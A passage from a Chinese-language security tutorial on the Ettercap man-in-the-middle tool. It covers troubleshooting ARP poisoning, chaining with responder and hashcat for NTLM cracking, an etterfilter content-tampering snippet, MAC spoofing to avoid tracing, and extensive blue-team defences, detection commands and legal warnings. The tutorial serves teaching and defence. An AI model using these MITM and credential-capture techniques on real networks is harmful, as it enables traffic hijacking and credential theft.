| 环节 | 成功标志 | 失败原因 |
| --- | --- | --- |
| 嗅探 | `Listening for unified sniffing` | 权限/接口 |
| MITM 启动 | 按 `o` 显示 `MITM ARP: REMOTE` | `-M` 参数错、目标不可达 |
| 流量经过 | 靶机的连接变慢/能看到它的流量 | 投毒方向不对（单向） |
| 抓到凭据 | `USER: ...  PASS: ...` | ① 协议加密（HTTPS）② 流量没经过你 ③ 时间窗不够 |
| ARP 恢复 | 靶机 `arp -a` 显示网关真实 MAC | 没正常退出（被 kill -9） |

**下一步**：

| 情况 | 动作 |
| --- | --- |
| 抓到明文凭据 | 记录到报告；**评估该协议为何还在用明文** |
| HTTPS 抓不到内容 | 需要 SSL MITM（`--certificate`），但**HSTS/证书固定会阻断** |
| 只看到用户名 | 该协议用挑战-响应（NTLM/Kerberos）→ 交给 [hashcat](../04-口令攻击/hashcat.md) |
| 想深度分析 | 用 `-w` 输出 pcap → [Wireshark](wireshark.md) |
| 想事后提取 | 用 `-L` 输出日志 → `etterlog -p` |
| **立即恢复环境** | 正常退出（`q`），验证 ARP 表已恢复 |

## 7. 与其他工具配合

```text
┌──── MITM 层 ─────────────────────────────────────┐
│ ettercap -M arp:remote（ARP 投毒）                │
│ 或 bettercap arp.spoof / IPv6 ndp.spoof          │
└──────────────┬───────────────────────────────────┘
               │ 流量经过攻击者
               ↓
┌──── 处理层 ──────────────────────────────────────┐
│ ettercap 内建凭据解析 → USER/PASS                 │
│ etterfilter .ef      → 内容篡改 / 丢弃 / 注入      │
│ ettercap -w          → pcap                       │
│ ettercap -L          → ettercap 日志              │
└──────────────┬───────────────────────────────────┘
               ↓
┌──── 深度分析层 ──────────────────────────────────┐
│ etterlog（凭据、连接、文件提取）                   │
│ wireshark / tshark（协议细节）                    │
│ hashcat（如果拿到哈希）                           │
└──────────────────────────────────────────────────┘
```

| 组合 | 说明 |
| --- | --- |
| **[tcpdump](tcpdump.md) → `ettercap -r`** | ⭐ **最安全的组合**：tcpdump 抓包，ettercap 离线解析凭据（**完全不需要 MITM**） |
| **ettercap → [Wireshark](wireshark.md)** | `-w` 输出 pcap → Wireshark 深度分析 |
| **ettercap → etterlog** | `-L` 输出日志 → `etterlog -p` 提取凭据 |
| **ettercap ↔ [bettercap](../05-无线攻击/bettercap.md)** | 都能做 ARP 投毒。**ettercap 的凭据解析器更全；bettercap 更易自动化** |
| **ettercap ↔ [responder](responder.md)** | ⭐ **互补**：ettercap 抓「已知目标的流量」，responder 抓「LLMNR/NBT-NS 名称解析」。**两者常同时运行** |
| **ettercap → [hashcat](../04-口令攻击/hashcat.md)** | 抓到 NTLM 挑战响应 → `hashcat -m 5600` 离线破解 |
| **ettercap ↔ [mitmproxy](mitmproxy.md)** | ettercap 做 MITM + 内容过滤；mitmproxy 做 HTTP/HTTPS 的应用层精细控制。**可以串联** |
| **ettercap ↔ [macchanger](macchanger.md)** | 改 MAC 后再投毒（减少被追踪），或用 tcpdump `-e` 验证 MAC |
| **[kismet](../05-无线攻击/kismet.md)** | 蓝队：检测 ARP 投毒的流量特征 |
| **`arpwatch`** | ⭐ 蓝队：检测 ARP 表变化 |

**⭐ 与 responder 的互补关系值得展开**：

| | Ettercap | Responder |
| --- | --- | --- |
| 攻击方式 | ARP 投毒（已知目标）+ 被动嗅探 | **伪造名称解析应答**（LLMNR/NBT-NS/mDNS） |
| 目标 | 「目标主机 ↔ 网关/服务器」的流量 | 「**任何广播名称查询失败**的设备」 |
| 抓到的 | 明文协议凭据、NTLM 挑战响应 | **NTLM 挑战响应** |
| 前提 | 目标在通信 | 目标发名称查询且解析失败 |
| 影响 | 目标流量经过你 | 目标被引导到你 |

**两者同时运行时**：ettercap 处理「已知的、正常通信的流量」，responder 捕获「因名称解析失败而广播的凭据尝试」。**覆盖面互补。**

## 8. 常见坑与排错

### 8.1 权限与接口

| 报错/现象 | 原因 | 解决 |
| --- | --- | --- |
| `You must be root` | 没有特权 | `sudo`；或给二进制 capability |
| `Interface eth0 is not up` | 接口没起来 | `ip link set eth0 up` |
| `No such interface` | 名字错 | `sudo ettercap -I` 看列表 |
| `ettercap` 卡在启动 | 在做初始 ARP 扫描（慢） | 加 `-z`（跳过初始扫描） |
| 在虚拟机里看不到别的设备 | 混杂模式没开，或网卡模式不对 | VirtualBox：网络 → 高级 → 混杂模式 → 「允许全部」 |

### 8.2 MITM 相关

| 报错/现象 | 原因 | 解决 |
| --- | --- | --- |
| **目标完全断网** | ① 用了 `-u`（unoffensive，不转发）；② 单向投毒；③ 本机 IP 转发没开 | ⭐ **检查 `sysctl net.ipv4.ip_forward`，应该为 1**；不要用 `-u` |
| **只有单向流量** | 只毒了一侧 | 用 `-M arp:remote`（双向）；检查两个 TARGET |
| MITM 启动了但看不到目标流量 | TARGET 写错 / 目标不在同一网段 | `-z` 跳过扫描后按 `l` 确认主机 |
| 提示 `MITM ARP: REMOTE` 但目标没感觉 | 目标有静态 ARP，或用了 IPv6 | 试 `-M ndp`；或换目标 |
| 目标在别的网段 | ARP 只在本广播域有效 | 用 `-M icmp` / `-M dhcp`；或做端口镜像 |
| **退出后目标还是断网** | ① 被 `kill -9` 了；② 恢复失败 | 在目标上手工 `arp -d <网关IP>`；或重启目标网络 |
| 影响范围失控（整个网段断网） | TARGET 写成了 `//` 或网段 | ⭐ **永远只写单个目标 IP** |
| 自己断网了 | 把自己的网关毒掉了 | 加 `-R` 反选排除自己；或不在被毒的链路上 |

**⭐ 「本机 IP 转发」是最常见的问题**：

```bash
# 检查
sysctl net.ipv4.ip_forward
# net.ipv4.ip_forward = 1   ← 必须是 1

# 临时开启
sudo sysctl -w net.ipv4.ip_forward=1

# 永久开启
echo 'net.ipv4.ip_forward=1' | sudo tee -a /etc/sysctl.d/99-ettercap.conf
sudo sysctl -p /etc/sysctl.d/99-ettercap.conf
```

**如果 `ip_forward = 0`**：ettercap 会把流量劫持过来但**不转发出去** → **目标完全断网**。

### 8.3 凭据嗅探相关

| 报错/现象 | 原因 | 解决 |
| --- | --- | --- |
| **抓不到任何凭据** | ① 流量加密（HTTPS）② 流量没经过你 ③ 协议不在解析器列表里 | 确认 MITM 生效；用 HTTP/FTP 等明文协议测试 |
| 只看到 `USER:` 没看到 `PASS:` | 协议用挑战-响应（NTLM/Kerberos） | 这是正常的——不是「明文口令」，要交给 [hashcat](../04-口令攻击/hashcat.md) |
| HTTPS 抓不到 | TLS 加密 | 需要 SSL MITM（`--certificate`），但**HSTS/证书固定会阻断** |
| `-q` 时看不到包内容 | 就是 `-q` 的作用 | 去掉 `-q` 看详细输出 |
| 想只看凭据不要噪声 | — | `-Q`（superquiet）会**隐藏**用户名密码；**不要用 `-Q`** |

### 8.4 etterfilter 相关

| 报错/现象 | 原因 | 解决 |
| --- | --- | --- |
| **`replace` 不生效** | ⭐ **新旧字符串长度必须完全一致** | 用等长字符串；或用 `regex()` / `inject()` |
| 编译报语法错 | C 语法问题 | 看编译器给的行号；注意分号、大括号 |
| `etterfilter: command not found` | 没安装 | `sudo apt install ettercap-common` |
| 过滤器加载了但没效果 | ① 条件不匹配（`tcp.src` vs `tcp.dst`）；② 流量是压缩的 | 先替换 `Accept-Encoding` 禁用压缩 |
| 改 HTTPS 内容失败 | TLS 加密 | 需要 SSL MITM；**HSTS 会阻断** |
| 注入的 JS 不执行 | 页面有 **CSP** | CSP 是一种防御——**这正是它存在的意义** |

**⭐ 「压缩」是一个容易忽略的坑**：

很多服务器会对 HTTP 响应做 gzip 压缩，**压缩后的字节里搜不到你的目标字符串**。所以标准的 etterfilter 脚本会先禁用压缩：

```c
if (ip.proto == TCP && tcp.dst == 80) {
    // "Accept-Encoding" 与 "Accept-Rubbish!" 都是 15 字符 —— 等长替换 ✅
    replace("Accept-Encoding", "Accept-Rubbish!");
}
```

### 8.5 ARP 恢复问题

| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 退出后目标还是把流量发给你 | 恢复失败 | ① 正常退出（按 `q`，不要 `kill -9`）② 在目标上 `arp -d` ③ 等 ARP 缓存过期（通常 2~20 分钟） |
| 用 `kill -9` 后目标断网了 | SIGKILL 不给 ettercap 清理机会 | ⭐ **永远用 `q` 正常退出**；或 `kill`（SIGTERM）让它有时间清理 |
| 恢复不确定 | — | **主动在目标上发一个 ARP 广播**，或用工具清除其 ARP 缓存 |

**⭐ 重要的操作规范**：

```text
1. 用 SIGTERM（kill）而不是 SIGKILL（kill -9）
2. 优先用 ettercap 自己的 'q' 退出
3. 每次测试结束都验证目标的 ARP 表已恢复
4. 记录你在哪些目标上做过投毒（便于事后清理）
```

## 9. 防御视角（蓝队）

Ettercap 是**最经典的 MITM 工具之一**，所以针对它的防御措施已经很成熟。

### 9.1 攻击面 → 对策总表

| Ettercap 的行为 | 蓝队对策 | 有效性 |
| --- | --- | --- |
| **ARP 投毒**（`-M arp`） | ⭐ **DHCP Snooping + Dynamic ARP Inspection（DAI）** | ✅ **高（彻底阻断）** |
| **ICMP 重定向**（`-M icmp`） | 关闭 ICMP 重定向（`net.ipv4.conf.*.accept_redirects=0`） | ✅ 高 |
| **DHCP 投毒**（`-M dhcp`） | **DHCP Snooping**；端口安全 | ✅ 高 |
| **IPv6 NDP 投毒**（`-M ndp`） | ⭐ **RA Guard + IPv6 首跳安全**；不需要 IPv6 就关掉 | ✅ 高 |
| **端口窃取**（`-M port`） | 端口安全（Port Security） | ✅ 中高 |
| **凭据嗅探**（明文协议） | ⭐ **全程加密**：HTTPS、SSH、SFTP、IMAPS、SMTPS、LDAPS、SNMPv3 | ✅ 高 |
| **SSL MITM** | ⭐ **HSTS（含 preload）+ 证书固定 + CT 监控** | ✅ 高 |
| **内容篡改**（etterfilter） | HSTS + **SRI（子资源完整性）** + **CSP** | ✅ 高 |
| **流量丢弃**（`drop()`） | 难以直接防（表现为「网络不稳」） | ⚠️ 只能靠检测 |

### 9.2 最重要的三条（按 ROI 排序）

```text
1. DHCP Snooping + Dynamic ARP Inspection
   → 彻底废掉 ARP 投毒（ettercap 的主要 MITM 手段）
   → 这一条就废掉了 -M arp / -M dhcp

2. 全程加密（HTTPS + HSTS preload + 证书固定）
   → 让凭据嗅探抓不到东西
   → 让 SSL MITM 被证书校验阻断
   → 让内容篡改被完整性校验阻断

3. IPv6 安全（或直接关闭 IPv6）
   → 防止攻击者绕过只覆盖 IPv4 的防御
```

### 9.3 具体配置

**① 交换机侧（阻断 ARP 投毒）**

以 Cisco 语法为例：

```text
! 启用 DHCP Snooping（ARP Inspection 的前提）
ip dhcp snooping
ip dhcp snooping vlan 10,20
no ip dhcp snooping information option
! 上联口（到 DHCP 服务器/核心）设为 trust
interface GigabitEthernet0/1
 ip dhcp snooping trust

! 启用 Dynamic ARP Inspection
ip arp inspection vlan 10,20
ip arp inspection validate src-mac dst-mac ip
! 上联口设为 trust
interface GigabitEthernet0/1
 ip arp inspection trust

! 端口安全（防 MAC 泛洪与端口窃取）
interface range GigabitEthernet0/2-24
 switchport port-security
 switchport port-security maximum 3
 switchport port-security violation restrict
 switchport port-security mac-address sticky

! IPv6 首跳安全
ipv6 nd raguard policy RAGUARD
 device-role host
interface range GigabitEthernet0/2-24
 ipv6 nd raguard attach-policy RAGUARD
```

**效果**：
- 未授权的 ARP 响应被交换机丢弃 → **ARP 投毒失效**；
- 未授权的 DHCP 服务器被阻断 → **DHCP 投毒失效**；
- 未授权的 RA 被阻断 → **NDP 投毒失效**。

**⭐ 这是对 ettercap 最有效的一整套防御。**

**② 主机侧**

**Linux**：

```bash
# 关闭 ICMP 重定向接收（防 -M icmp）
sudo sysctl -w net.ipv4.conf.all.accept_redirects=0
sudo sysctl -w net.ipv4.conf.default.accept_redirects=0
sudo sysctl -w net.ipv4.conf.all.send_redirects=0
sudo sysctl -w net.ipv6.conf.all.accept_redirects=0

# 不开 IP 转发（你不是路由器）
sudo sysctl -w net.ipv4.ip_forward=0

# 关键主机用静态 ARP（小网络可行，大网络不现实）
sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff
```

**Windows**：

```powershell
# 关闭 ICMP 重定向
Set-NetIPInterface -InterfaceAlias "Ethernet" -IgnoreDefaultRoutes Enabled
# 或通过注册表：HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\EnableICMPRedirect = 0
```

**③ Web 侧（防内容篡改与 SSL MITM）**

```
# HSTS（必须包含 preload 才有完整效果）
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

# CSP（防注入的 JS 执行）
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...'

# 关键子资源的完整性校验
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-..." crossorigin="anonymous"></script>
```

**④ 应用侧**

| 应用 | 措施 |
| --- | --- |
| 移动 App | **证书固定（certificate pinning）** |
| 桌面客户端 | 证书固定 + 不忽略证书错误 |
| 内部服务 | 全部启用 TLS，禁用明文协议 |

**⭐ 一项必须做的检查**：

```bash
# 检查网络里还有哪些明文协议在用
sudo tcpdump -i eth0 -nn -c 1000 \
  '(tcp port 23 or tcp port 21 or tcp port 110 or tcp port 143 or tcp port 389 or udp port 161)'
```

**看到任何输出就是配置风险**——这些协议**必须**被替换。

### 9.4 检测（当预防失效时）

**① 检测 ARP 投毒（最可检测的攻击）**

| 检测点 | 方法 |
| --- | --- |
| **ARP 表变化** | 监控网关 IP 对应的 MAC 是否变化 |
| **同一 IP 多个 MAC** | ⭐ **最可靠的信号** |
| **ARP 响应频率异常** | ettercap 会持续发 ARP 响应（每秒数个），远超正常 |
| **ARP 的 gratuitous 包** | 投毒会产生大量 gratuitous ARP |

**⭐ 用 `arpwatch` 做自动检测**：

```bash
sudo apt install arpwatch
sudo arpwatch -i eth0

# 它会记录所有 ARP 变化到 /var/lib/arpwatch/arp.dat
# 并在变化时（可配置）发邮件告警
```

**⭐ 用 tcpdump 一行检测「同一 IP 多个 MAC」**：

```bash
sudo tcpdump -i eth0 -nn -e 'arp.opcode == 2' 2>/dev/null | \
  awk '{print $(NF-2), $NF}' | sort -u | \
  awk '{count[$1]++; macs[$1] = macs[$1] " " $2} END {for (ip in count) if (count[ip] > 1) print "⚠️ " ip, macs[ip]}'
```

**输出（有投毒时）**：

```
⚠️ 192.168.1.1  aa:bb:cc:dd:ee:ff 08:00:27:aa:bb:cc
```

**👆 这就是 ARP 投毒的**铁证**——网关 IP 同时对应两个 MAC。**

**② 检测 DHCP 投毒**

```bash
# 找出所有 DHCP 服务器（正常应该只有一个）
sudo tcpdump -i eth0 -nn 'udp port 67' -A | \
  grep -oP 'Server Identifier.*?\K[0-9.]+'
```

**出现多个 DHCP 服务器 IP = 有 rogue DHCP。**

**③ 检测 IPv6 投毒**

```bash
# 找出所有发送 RA 的设备（正常应该只有路由器）
sudo tcpdump -i eth0 -nn -e 'icmp6 and ip6[40] == 134'
```

**出现非路由器的 MAC = rogue RA。**

**④ 检测明文凭据（作为「数据泄露」的信号）**

```bash
sudo tcpdump -i eth0 -nn -l -A -s 0 \
  '(tcp port 80 or tcp port 21 or tcp port 110)' | \
  grep -iE 'Authorization:|^USER |^PASS '
```

**任何输出都意味着有明文凭据在网络上传输——这本身就是一个需要立即修复的问题。**

**⑤ 检测流量异常（MITM 的间接信号）**

| 信号 | 说明 |
| --- | --- |
| 主机的网关 MAC 变化 | ⭐ ARP 投毒的后果 |
| **TTL 值异常**（比正常少 1） | 流量多经过了一跳（经过攻击者） |
| 路由跳数增加 | — |
| 网络突然变慢 | 流量绕路 + 攻击者转发能力有限 |

**⭐ TTL 检测的原理**：

```
正常：客户端 → 服务器       TTL = 64（或 128）
被 MITM：客户端 → 攻击者 → 服务器   TTL = 63（攻击者转发时减 1）
```

**如果服务器侧看到的 TTL 比预期少了 1，说明中间多了一跳。**

**⑥ 一条实用的巡检命令**

```bash
# 找出所有 ARP 响应的 (IP, MAC) 组合
sudo tcpdump -i eth0 -nn -e -c 5000 'arp.opcode == 2' 2>/dev/null | \
  awk '{print $(NF-2), $NF}' | sort | uniq -c | sort -rn | head -30
```

**正常输出**：

```
   42 aa:bb:cc:dd:ee:ff 192.168.1.1
   18 11:22:33:44:55:66 192.168.1.100
```

**异常输出**：

```
   42 aa:bb:cc:dd:ee:ff 192.168.1.1
   38 08:00:27:aa:bb:cc 192.168.1.1      ← ⚠️ 同一个 IP，不同的 MAC！
```

### 9.5 一个常被忽略的点：IPv6

**很多组织部署了完善的 IPv4 安全措施（防火墙、IDS、DAI），但完全忽略了 IPv6。**

**风险**：

> 如果主机是双栈的（同时有 IPv4 和 IPv6），**攻击者可以选择走 IPv6 这条没有防御的路**。
>
> Ettercap 的 `-M ndp` 就是这个思路。

**检查清单**：

```bash
# 1) 你的主机有没有 IPv6 地址？
ip -6 addr show
# 如果有 fe80::/10（link-local），说明 IPv6 是开着的

# 2) 有没有 IPv6 监控？
# 检查防火墙规则、IDS 规则是否覆盖 IPv6

# 3) 是否真的需要 IPv6？
# 如果不需要 → ⭐ 直接禁用（最彻底的方案）
```

**禁用 IPv6（Linux）**：

```bash
# 临时
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1

# 永久
cat | sudo tee /etc/sysctl.d/99-disable-ipv6.conf <<'EOF'
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
EOF
sudo sysctl -p /etc/sysctl.d/99-disable-ipv6.conf
```

**⭐ 如果业务需要 IPv6，则必须把 IPv4 的所有防御措施在 IPv6 上做一遍**（RA Guard、DHCPv6 Snooping、IPv6 的 DAI 等价物等）。

## 10. 参考

- 官方站点：<https://ettercap.github.io/ettercap/>
- 官方文档：<https://ettercap.github.io/ettercap/documentation.html>
- 官方仓库：<https://github.com/Ettercap/ettercap>
- Kali 工具页：<https://www.kali.org/tools/ettercap/>
- 本机手册：`man ettercap`、`man etterlog`、`man etterfilter`
- 本机帮助：`ettercap -h`、`etterlog -h`、`etterfilter -h`
- 相关本目录：[wireshark](wireshark.md)、[tcpdump](tcpdump.md)、[responder](responder.md)、[mitmproxy](mitmproxy.md)、[macchanger](macchanger.md)
- 相关其他目录：[bettercap](../05-无线攻击/bettercap.md)、[kismet](../05-无线攻击/kismet.md)、[hashcat](../04-口令攻击/hashcat.md)

## ⚠️ 法律与伦理

**Ettercap 的核心功能是「中间人攻击」——这在法律上的性质比单纯嗅探更严重。**

**为什么**：

| 行为 | 法律性质 |
| --- | --- |
| **ARP 投毒** | **劫持他人网络流量**——主动干预他人通信 |
| **流量转发/修改** | 篡改数据完整性 |
| **凭据提取** | 窃取他人凭据 |
| **内容篡改**（etterfilter） | **修改他人数据**——可能构成诈骗预备 |
| **SSL MITM** | 破解加密通信 |
| **`-u`（不转发）** | **拒绝服务**——直接中断他人网络 |

**特别警告**：

> **Ettercap 的 `-M arp:remote // //`（TARGET 为空）会投毒整个广播域。**
>
> 这不是「不小心」，而是**同时劫持所有设备的流量**——在法律上是非常严重的行为。
>
> **永远只写单个、已授权的目标 IP。**

**相关法律责任**（中国大陆）：

| 法律 | 条款 | 行为 |
| --- | --- | --- |
| 《刑法》 | 第二百八十五条 | **非法侵入计算机信息系统罪** / **非法获取计算机信息系统数据罪** |
| 《刑法》 | 第二百八十六条 | **破坏计算机信息系统罪**（`-u` 造成断网、内容篡改导致业务异常） |
| 《刑法》 | 第二百五十三条之一 | **侵犯公民个人信息罪**（窃取凭据） |
| 《刑法》 | 第二百六十六条 | **诈骗罪**（若用内容篡改做钓鱼） |
| 《网络安全法》 | 第二十七条 | 禁止任何危害网络安全的活动 |
| 《个人信息保护法》 | 相关条款 | 截获、处理个人信息的合法性基础 |
| 《数据安全法》 | 相关条款 | 数据处理活动的合规要求 |

**本教程仅适用于**：

- ✅ **你自己搭建的完全隔离的实验网络**（host-only 虚拟网络、隔离 VLAN，**没有别人的设备**）
- ✅ 有**书面授权**、明确列出授权 IP 范围**与允许的攻击类型**的渗透测试
- ✅ 授权的 CTF 靶场

**⚠️ 关于「家庭网络」的重要提醒**：

> **不要在自己的家庭网络（有家人设备）上做 ARP 投毒。**
> 家人的设备不是「你的设备」——即使你拥有路由器，**劫持他们的流量仍然违法**。
>
> 用 **host-only 虚拟机网络**：只有你的 Kali + 你的靶机。

**使用前的强制检查清单**：

```text
[ ] -i 指定的网卡连的是隔离实验网络（不是生产网、不是家庭网）？
[ ] TARGET 只写了单个我已授权的 IP（不是 // 或网段）？
[ ] 确认了 net.ipv4.ip_forward = 1（否则目标会断网）？
[ ] 没有使用 -u（unoffensive）？
[ ] 我知道退出时会恢复 ARP 表，且我会验证？
[ ] 我的授权书里明确写了允许 ARP 投毒？
[ ] 如果需要 IPv6，授权书里也覆盖了 IPv6 投毒？
```

**任何一项打不上勾，就不要运行。**

**最安全的学法（强烈推荐）**：

```text
⭐ 用 ettercap -r 分析已有的 pcap 文件
   sudo ettercap -T -q -r /path/to/capture.pcap -L /tmp/parsed.log
   etterlog -p /tmp/parsed.log

   → 这完全不需要 MITM，不投毒，不影响任何网络！
   → 但能学到：凭据解析原理、协议识别、etterlog 使用
   → 覆盖了 70% 的知识点，零法律风险

✅ 在 host-only 虚拟网络里，用你自己的 Kali + 靶机做 MITM 实验
   → 覆盖 100% 的知识点，完全隔离

✅ 读 etterfilter 的语法文档，理解「内容篡改」的原理
   → 理解为什么 HSTS/SRI/CSP 是必要的
```

**最后一句**：Ettercap 展示的攻击手法（ARP 无认证、DNS 无验证、明文协议、缺乏完整性保护）**每一条都对应一项成熟的防御措施**。学它的价值在于**知道该防什么**，而不是用它去攻击别人。
